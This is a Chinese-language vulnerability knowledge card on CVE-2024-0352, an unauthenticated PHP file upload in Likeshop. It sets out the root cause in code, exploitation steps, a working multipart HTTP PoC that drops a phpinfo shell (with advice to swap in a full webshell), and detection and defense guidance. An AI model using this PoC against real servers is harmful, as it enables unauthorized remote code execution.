---
id: web-generic-file-upload-likeshop-formimage-unauth-extensionless-php-webshell
title: Likeshop ≤2.5.7.20210311 未授权上传：/api/file/formimage 免登录经 FileServer 存储引擎落地 PHP webshell（CVE-2024-0352）
type: scenario
domain: web
path: web/generic/file-upload
technique: likeshop-formimage-unauth-upload-no-extension-validation
tags:
- web
- file-upload
- likeshop
- thinkphp
- cve-2024-0352
- unauthenticated
- webshell
- rce
cve:
- CVE-2024-0352
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: Up to (including) 2.5.7.20210311
verification:
  verified_by: verifier-V581
  verified_at: '2026-11-12T12:37:40+08:00'
  notes: 已对照原文与全部7图核对：图01 /install/install.php 安装、图02 头像入口 /mobile/pages/bundle/user_profile/user_profile、图03 Burp POST /api/file/formimage 上传 a.php 回显 code=1/上传文件成功/url=uploads/user/20240126154610517051055.php/name=a.php、图04 该 URL 输出 phpinfo、图05 代码搜索定位 File.php/FileServer.php、图06 存储引擎目录 Aliyun/Local/Qcloud/Qiniu/Server.php+Driver.php、图07 修复版回显 上传文件失败:该文件类型不允许上传，均与卡一致。受影响版本 Up to (including) 2.5.7.20210311 与 CVE-2024-0352 原文明确，已 set-versions 写入同一标记。dedup 全部候选为 new（最相近 Laravel uploadPhoto 为不同应用/入口代码路径/CVE），非同一链；dup-scan 无本卡 pair。原文明确 =['formImage','test'] 免登录、setUploadFile/upload 无校验、修复版 Upload fileExt 白名单，卡中原理/利用步骤/PoC 与之一致；随机文件名保留原后缀（响应 name=a.php、url 以 .php 结尾）有图证。未验证点：PoC 未在本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/generic/file-upload/web-generic-file-upload-likeshop-formimage-unauth-extensionless-php-webshell/
draft: false
kb_aliases:
- CVE-2024-0352
- Likeshop 文件上传漏洞
- FileServer::userFormImage
- /api/file/formimage
- StorageDriver 无后缀校验
- likeshop getshell
---

## 一句话结论

Likeshop ≤ 2.5.7.20210311（ThinkPHP 商城）把 `formImage` 放进控制器免登录白名单，`POST /api/file/formimage` 无需登录即可进入 `FileServer::userFormImage()`；该方法经 `StorageDriver` 委托给本地存储引擎，`setUploadFile()` 只做 `request()->file('file')` 接收并生成随机文件名（保留原后缀），`upload()` 全程没有后缀或内容校验，上传 `a.php` 后文件落在 `uploads/user/<日期>/<随机>.php` 并在响应里返回可访问 URL，Web 服务器按 PHP 解析即 getshell。

## 原理

- **免登录入口**：`application/api/controller/File.php` 中 `public $like_not_need_login = ['formImage','test'];` 把 `formImage` 加入无需登录的接口白名单，`formImage()` 直接调用 `FileServer::userFormImage($this->user_id)`（未登录时 user_id 为 0），因此攻击者无需任何凭据即可触达上传逻辑。
- **存储驱动不做校验**：`userFormImage()` 读取存储配置后 `new StorageDriver($config)`，`setUploadFile('file')` 经 `Driver.php` 转发到具体引擎；本地引擎 `Server.php::setUploadFile()` 只执行 `request()->file($name)` 取文件、`getInfo()` 取原始信息、`buildSaveName()` 生成随机文件名，没有任何扩展名/`Content-Type`/文件头校验。
- **upload 同样无过滤**：`StorageDriver::upload($save_dir)` 直接转发到引擎 `upload()`，把文件写入 `$save_dir`（默认 `uploads/user`），成功后 `getFileName()`/`getFileInfo()` 用于拼 `uri => uploads/user/<随机名>` 并写入 `user_file` 表、返回 `url`/`base_url`/`name`。响应中的 `name` 仍是原始文件名 `a.php`、`url` 以 `.php` 结尾，说明 `buildSaveName()` 只随机化了主文件名而保留原后缀。
- **随机文件名不等于安全**：随机化只提高猜测成本，响应体直接回显完整 URL，攻击者无需猜测即可访问；上传目录位于 Web 根下，默认 Web 服务器会把 `.php` 交给 PHP-FPM/Apache 解析，`<?php phpinfo(); ?>` 立即执行。
- **修复方式**：修复版在 `Server.php::setUploadFile()` 中加入 `new Upload()` 验证，`Upload` 继承 ThinkPHP `Validate` 并定义 `fileExt:jpg,jpeg,gif,png,bmp,tga,tif,pdf,psd,avi,mp4,mp3,...` 白名单，`check(['file' => request()->file($name)])` 不通过即抛"该文件类型不允许上传"，从入口拒绝非白名单后缀。

## 触发条件

- 目标为 Likeshop ≤ 2.5.7.20210311（含该版本）；路由 `/api/file/formimage` 可访问（默认存在）。
- 未登录或任意登录态均可（`formImage` 在免登录白名单，user_id 允许为 0）。
- 存储配置使用本地引擎（默认 `local`），上传目录位于 Web 可访问路径且其中 `.php` 等脚本后缀会被 Web 服务器解析；若使用云存储或上传目录禁止脚本执行，则不能直接 getshell（可能转为存储桶滥用/钓鱼）。
- 应用未在网关/WAF 层对上传内容做额外限制。

## 利用步骤

1. 访问站点完成安装（`/install/install.php`）或直接以现成实例为目标，确认版本为 2.5.7/2.5.7.20210311 及以下。
2. 进入个人中心头像上传（`/mobile/pages/bundle/user_profile/user_profile`）等会调用上传接口的页面，抓取 `POST /api/file/formimage` 请求（含 `token`/`Cookie` 均可留空或使用任意测试账号）。
3. 把 multipart 中的文件字段改为 `name="file"; filename="a.php"`、`Content-Type: application/octet-stream`，内容为 `<?php phpinfo(); ?>`，其余字段保持原样发送。
4. 响应 `code=1`、`msg=上传文件成功`，从 `data.url` 取得上传后的完整地址（如 `/uploads/user/20240126154610517051055.php`）。
5. 浏览器访问该地址，若返回 phpinfo/命令执行结果即确认可解析；将内容换成功能更全的 webshell 即可持久控制。
6. 若上传目录被禁止解析，可尝试白名单/解析绕过或改为上传 `.htaccess`（需 AllowOverride）等二次利用，见关联卡。

## PoC

```http
POST /api/file/formimage HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="a.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
------boundary--
```

成功响应（节选）：

```json
{"code":1,"msg":"上传文件成功","data":{"url":"http://127.0.0.1:8000/uploads/user/20240126154610517051055.php","base_url":"uploads/user/20240126154610517051055.php","name":"a.php"}}
```

访问 `url` 即触发 PHP 解析。原文在 2.5.7 本地环境实测 `phpinfo()` 输出，修复版同请求返回 `上传文件失败:该文件类型不允许上传`；PoC 未在本机复跑。

## 变体与关联

- 变体：`$like_not_need_login` 中的 `test` 及其它免登录方法同样无需鉴权，可按同一思路审计其它控制器的上传/写文件入口。
- 变体：`StorageDriver` 支持 Local/Aliyun/Qcloud/Qiniu 等引擎；云引擎下任意文件上传可转为对象存储滥用、覆盖已有对象或配合 CDN 传播恶意内容。
- 关联：[[web-generic-file-upload-dotnet-uploadpicture-aspx-webshell]]、[[web-generic-file-upload-artery-erp-servletupload-phoneupload]] 等"特定应用上传无后缀校验"卡；上传目录解析/白名单绕过见 [[web-generic-file-upload-blacklist-double-write-bypass]] 等通用卡；ThinkPHP 侧代码执行见 [[web-php-framework-thinkphp-invokefunction-file-put-contents-webshell]]。
- 边界：上传目录禁止脚本执行、云存储、WAF 拦截 multipart 脚本内容、或应用加了文件头/图片二次渲染时，直接 webshell 路径失效；修复版本已加 `fileExt` 白名单。

## 检测与防御

- 检测：`/api/file/formimage` 出现 `.php`/`.phtml` 等脚本后缀的 multipart 文件名；上传后短时间访问同一 `uploads/user/...` 路径；响应中 `name` 与 `url` 后缀为可执行脚本；Web 日志中出现 `uploads/*.php` 的 200 访问。
- 防御：升级到修复版本；对上传做"白名单后缀 + 文件头/内容校验 + 二次渲染"，不要只依赖随机文件名；上传目录禁止脚本解析（Nginx `location ~ \.php$ { deny all; }` 或独立域名/CDN 回源）；严格鉴权，不把上传接口放进免登录白名单；WAF 检测 multipart 内的脚本标签。
- 加固：上传目录与代码目录分离、文件落盘后重命名为无后缀随机名并由应用层用 Content-Disposition 输出；最小权限运行 PHP 进程。
